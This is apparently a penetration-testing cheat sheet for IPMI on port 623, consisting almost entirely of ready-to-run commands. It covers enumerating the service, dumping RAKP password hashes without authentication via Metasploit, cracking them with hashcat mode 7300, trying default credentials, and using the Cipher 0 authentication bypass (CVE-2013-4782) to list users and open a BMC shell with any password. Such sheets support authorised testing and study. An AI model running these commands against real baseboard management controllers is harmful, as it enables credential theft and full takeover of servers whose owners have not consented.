# IPMI (623)

!!! tip "Start here"
    Fingerprint IPMI first, then test whether the BMC exposes an IPMI 2.0 RAKP challenge that can be captured for an identified user. Hashcat mode 7300 handles captured RAKP HMAC-SHA1 material.

---

## Enumeration

```bash
nmap -sU -p 623 --script ipmi-version $IP
```

---

## Hash Dump (Unauthenticated)

```bash
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS $IP
run
```

```bash
hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Default Credentials

Test vendor defaults only after identifying the BMC vendor and confirming default-credential checks are authorized. For example, `root:calvin` is associated with Dell iDRAC rather than IPMI generally.

```bash
ipmitool -I lanplus -H $IP -U admin -P admin chassis status
```

---

## Cipher 0 Auth Bypass (CVE-2013-4782)

[CVE-2013-4782](https://nvd.nist.gov/vuln/detail/CVE-2013-4782) covers affected BMC implementations that accept Cipher 0 with an arbitrary password for a valid username. Confirm support with the Metasploit `auxiliary/scanner/ipmi/ipmi_cipher_zero` scanner before attempting privileged commands.

```bash
msfconsole
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS $IP
run
```

```bash
ipmitool -I lanplus -C 0 -H $IP -U ADMIN -P anything user list
```

---

## Post-Auth Commands

```bash
ipmitool -I lanplus -H $IP -U "$USERNAME" -P "$PASSWORD" user list
ipmitool -I lanplus -H $IP -U "$USERNAME" -P "$PASSWORD" sensor
ipmitool -I lanplus -H $IP -U "$USERNAME" -P "$PASSWORD" sel list
ipmitool -I lanplus -H $IP -U "$USERNAME" -P "$PASSWORD" shell
```

`-P` exposes the password in the process arguments. Prefer `-a` instead of `-P "$PASSWORD"` when an interactive password prompt is practical.
